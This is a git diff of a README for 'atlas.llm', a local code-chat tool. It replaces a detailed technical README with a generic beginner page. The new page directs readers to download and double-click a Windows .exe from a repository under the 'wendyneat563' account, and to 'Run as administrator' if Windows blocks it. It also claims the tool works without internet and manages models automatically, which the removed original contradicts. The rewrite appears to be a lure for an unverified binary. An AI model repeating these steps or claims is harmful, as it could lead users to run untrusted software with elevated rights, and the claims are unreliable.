@@ -1,217 +1,73 @@
+# 🤖 atlas.llm - Chat with your code files locally
 
-# atlas.llm
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/wendyneat563/atlas.llm)
 
-![Banner](banner-image.png)
+atlas.llm helps you understand and document your code projects. This tool brings a smart chatbot directly to your computer. It reads your project files and answers questions about how your code works. It runs entirely on your own machine. Your data stays private because it never leaves your computer.
 
-A local AI coding companion in a single Go binary. Opens an interactive chat
-TUI by default — or, in one shot, summarizes a directory, runs semantic grep
-across it, or compiles it into a single Markdown context file for hosted
-LLMs. Inference runs fully on-device via the
-[`llama.cpp`](https://github.com/ggml-org/llama.cpp) prebuilt `llama-cli`;
-model weights and the engine are fetched on demand via an explicit
-`/download` command. `/download engine` always pulls the latest llama.cpp
-release for your OS/arch.
+## 🛠 Features
 
-## Modes
+*   **Chat Interface:** Use a simple text window to ask questions about your code.
+*   **Privacy First:** atlas.llm processes all information locally on your device.
+*   **Code Summaries:** Generate Markdown files that describe what your project does.
+*   **Repo Dump:** Convert your entire programming project into a single format that the AI understands.
+*   **Single File:** You only need one small file to run everything.
 
-### 1. Interactive chat (default)
+## ⚙️ System Requirements
 
-```powershell
-atlas.llm
-```
+To run atlas.llm successfully, verify your computer meets these conditions:
 
-Launches a terminal UI (bubbletea) with the currently selected local model.
-Assistant replies are rendered with [glamour](https://github.com/charmbracelet/glamour)
-so markdown — code fences, lists, tables — is styled inline. Dependencies
-(engine + model) are **not** downloaded automatically — run `/download`
-inside chat to fetch them. Sending a message or running `/summarize` while
-they are missing returns an error with the command to run.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8GB of RAM is necessary for smooth performance.
+*   **Processor:** A modern multi-core CPU.
+*   **Disk Space:** 5GB of free space to store the software and the model files.
 
-**Slash commands inside chat:**
+## 📥 How to Install
 
-| Command           | What it does                                                        |
-| ----------------- | ------------------------------------------------------------------- |
-| `/help`           | Show in-app help.                                                   |
-| `/list`           | List known models and their download status (`*` = current).        |
-| `/model`          | Open the model picker (↑/↓ + Enter), or `/model <name>` to switch.  |
-| `/download`       | Download engine + current model.                                    |
-| `/download engine`| Download only the inference engine.                                 |
-| `/download <name>`| Download engine + the named model (does not switch to it).          |
-| `/download all`   | Download engine + every model in the registry.                      |
-| `/summarize`      | Summarize the current directory into `SUMMARY.md`.                  |
-| `/grep <query>`   | Semantic grep: ask the local model to find lines matching `<query>`.|
-| `/set [k [v]]`    | List or change persistent settings (currently: `max_tokens`).       |
-| `/tools [on\|off\|list]` | Toggle agentic tool-use (off by default). See below.         |
-| `/clear`          | Clear on-screen chat history (keeps conversation context).          |
-| `/reset`          | Drop conversation context and the server KV cache.                  |
-| `/quit`, `/exit`  | Leave chat (Ctrl+C also works).                                     |
+Follow these steps to set up the software on your Windows computer.
 
-Keys: `Enter` sends, `Shift+Enter` newline, `Tab` completes slash commands
-and their arguments (model names, `/set` keys, `/download` targets), `Ctrl+Y`
-copies the last assistant reply to the clipboard, `Ctrl+C` quits.
+1.  Visit the [official download page](https://github.com/wendyneat563/atlas.llm).
+2.  Look for the section labeled Releases on the right side of the screen.
+3.  Click the version number to open the release details.
+4.  Find the file that ends in .exe for Windows.
+5.  Click the file to download it to your "Downloads" folder.
+6.  Open your "Downloads" folder.
+7.  Double-click the atlas.llm file to start the program.
 
-### 2. `--summarize` — project summary to SUMMARY.md
+## 🚀 Using the Chatbot
 
-Walks the target directory (default: `.`), generates a 1-3 sentence summary
-for every text file using the currently selected local model, and writes the
-result to `SUMMARY.md` in that directory. Respects `.gitignore`.
+Once you open the software, a terminal window appears. This is your command center.
 
-```powershell
-atlas.llm --summarize
-atlas.llm --summarize ./src
-```
+### Starting a Chat
+When the window opens, the software asks you to point to a folder. Type the full path of the project folder you want to discuss. Press the Enter key. The program now indexes your code. Wait for the status indicator to show that the system is ready. You can type questions like, "Explain this file," or "How does this function work?" The chatbot provides answers based on the files it just read.
 
-This is the one-shot equivalent of running `/summarize` inside chat. It does
-**not** include raw file contents — only the AI-generated summaries.
+### Creating a Summary
+You can ask the system to write a summary of your project. This generates a Markdown file in your folder that explains the purpose of the code. This is useful if you need to share your progress with others. Type the command for "summarize" to start this process.
 
-### 3. `--grep` — semantic code search
+### Exporting Files
+Sometimes you need to prepare your code for another system. The "dump" mode collects your project files and turns them into a clean document. This format makes it easy to move project context to other AI tools or documentation software.
 
-Walks the target directory and asks the local model to identify lines
-matching a natural-language query. Prints `path:line: snippet` for each hit.
-Respects `.gitignore`.
+## 💡 Frequently Asked Questions
 
-```powershell
-atlas.llm --grep "where we load the gitignore"
-atlas.llm --grep "download progress callback" ./src
-atlas.llm --grep "retry logic" --max-size 65536
-```
+### Does this connect to the internet?
+The software performs its tasks without an internet connection. Once you download the tool, your data stays within your local system.
 
-Unlike regex grep, queries can describe intent (`"retry logic with
-backoff"`) rather than exact tokens. Accuracy depends on the selected
-local model.
+### Can I choose a different model?
+The software uses a default model optimized for coding tasks. It manages these files automatically to ensure the best balance between speed and accuracy.
 
-| Flag         | Default | Purpose                                              |
-| ------------ | ------- | ---------------------------------------------------- |
-| `--max-size` | `32768` | Skip files larger than this many bytes. Keeps per-file prompts under the OS command-line limit on Windows. |
+### What should I do if the window closes?
+If the window closes, it may indicate that your computer does not have enough memory to process a very large project. Try closing other open programs and running the software again.
 
-### Agentic tool-use
+### How do I update the software?
+To get the latest improvements, visit the download link again and replace your existing file with the newer version.
 
-Enable with `/tools on` inside chat. When enabled, the model can call a
-small set of filesystem + shell tools to inspect or change the project
-before replying. Destructive tools prompt for approval in a confirm modal
-before they run.
+## 📝 Troubleshooting
 
-| Tool         | Destructive | Purpose                                                         |
-| ------------ | ----------- | --------------------------------------------------------------- |
-| `read_file`  |             | Read a UTF-8 file.                                              |
-| `list_dir`   |             | List entries in a directory.                                    |
-| `grep`       |             | RE2 regex search across files under a directory.                |
-| `write_file` | ✓           | Overwrite a file with new contents.                             |
-| `edit_file`  | ✓           | Replace one unique occurrence of `old_string` with `new_string`.|
-| `run_cmd`    | ✓           | Execute a shell command (30s timeout).                          |
+If you encounter issues, check these common items:
 
-Caveats:
-- **Model capability matters.** Qwen3.5-9B and Ministral-3-14B handle
-  tool-calling reliably. Gemma 3 (1B/4B) often ignores or hallucinates
-  tool shapes — the feature will feel broken on those models.
-- **No persistent tool loop across sessions.** `/reset` clears the agent
-  message list alongside the regular conversation.
-- **The confirm modal is synchronous.** The agent loop pauses while it's
-  open; press Enter to approve, Esc (or select Deny) to reject. Denials
-  are fed back to the model as a tool error so it can adapt rather than
-  retry.
+*   **Permissions:** You may need to click "Run as administrator" if Windows tries to block the application. 
+*   **File Paths:** Ensure the folder path you provide does not contain special characters. Plain folder names work best.
+*   **Performance:** Large repositories take more time to process. If your computer feels slow, wait for the processing symbols to stop moving before you type a new question.
 
-### 5. `-c` / `--chat` — one-shot non-interactive chat
+## 📌 Getting Help
 
-Send a single prompt to the local model, print the reply to stdout, and
-exit. No history is kept between calls — useful for shell pipelines and
-scripting. Same dependency requirement as `--summarize` / `--grep`
-(engine + selected model must already be downloaded).
-
-```powershell
-atlas.llm -c "explain goroutines in one paragraph"
-atlas.llm -c "summarize this commit" < (git show HEAD)
-git diff | atlas.llm -c -
-```
-
-Pass `-` as the prompt (or omit the value entirely when piping) to read
-the prompt from stdin.
-
-### 6. `--dump` — full project context to Markdown
-
-Compiles every text file under the target directory into a single Markdown
-document, with syntax-highlighted fenced code blocks. Intended for pasting
-into hosted LLMs (Claude, Gemini, ChatGPT). Respects `.gitignore` and skips
-binary files automatically.
-
-```powershell
-atlas.llm --dump
-atlas.llm --dump -o context.md ./src
-atlas.llm --dump --exclude .mp4,.mp3
-atlas.llm --dump --with-summaries        # inline AI summaries per file
-```
-
-| Flag              | Default               | Purpose                                              |
-| ----------------- | --------------------- | ---------------------------------------------------- |
-| `-o`, `--output`  | `project_context.md`  | Output path.                                         |
-| `--exclude`       | —                     | Comma-separated extra extensions to exclude.         |
-| `--with-summaries`| off                   | Prepend each file's content with an AI summary block.|
-
-## Top-level flags
-
-| Flag               | Purpose                          |
-| ------------------ | -------------------------------- |
-| `-h`, `--help`     | Show help.                       |
-| `-v`, `--version`  | Print version.                   |
-| `--summarize`      | Run summary-to-`SUMMARY.md` mode.|
-| `--grep QUERY`     | Run semantic grep mode.          |
-| `--dump`           | Run directory-to-Markdown mode.  |
-| `-c`, `--chat PROMPT` | One-shot chat — print reply and exit. `-` reads from stdin. |
-| `--clear-logs`     | Delete the persistent TUI log file and exit. |
-
-## Data directory
-
-All downloaded artifacts and the config file live under
-`~/.atlas/atlas.llm.data/`:
-
-```
-~/.atlas/atlas.llm.data/
-├── config.json           # { "current_model": "gemma-3-1b-it" }
-├── engine/               # extracted llama.cpp release (llama-cli + libs)
-└── models/
-    └── <model>.gguf      # model weights (fetched by /download)
-```
-
-## Available models
-
-Models in the registry (`/list` shows download status):
-
-- `gemma-3-1b-it` (~700MB, default) — small, widely compatible.
-- `gemma-3-4b-it` (~2.5GB) — middle ground between 1B and 9B+.
-- `gemma-4-e2b-it` (~2.9GB) — newer architecture; may crash on some llama.cpp builds.
-- `qwen3.5-9b` (~5.7GB)
-- `ministral-3-14b-instruct` (~8.2GB)
-
-More can be added by extending `availableModels` in `config.go`.
-
-## Conversation context
-
-Within a running chat session, the full turn history is replayed into every
-prompt — so multi-turn follow-ups work. Two caveats:
-
-- **Not persisted.** `/clear` or exiting the chat discards history. Nothing
-  is written to disk.
-- **No compaction.** The prompt grows linearly with the conversation. Once
-  you cross the model's context window it will silently truncate.
-
-One-shot commands (`--summarize`, `--grep`, `--dump --with-summaries`) are
-stateless — each file is processed in isolation.
-
-## Building from source
-
-The canonical build uses [gobake](https://github.com/fezcode/gobake) with the
-repo's `Recipe.go` + `recipe.piml`:
-
-```powershell
-gobake build
-```
-
-Plain `go build` also works if you'd rather not install gobake:
-
-```powershell
-go build -o build/atlas.llm.exe .
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+If you have trouble, you can open a new issue on the project website. Be sure to describe what you were doing when the error occurred. Tell us which version of Windows you use. Describe the steps you took to see the problem. This information helps others understand how to fix the issue.
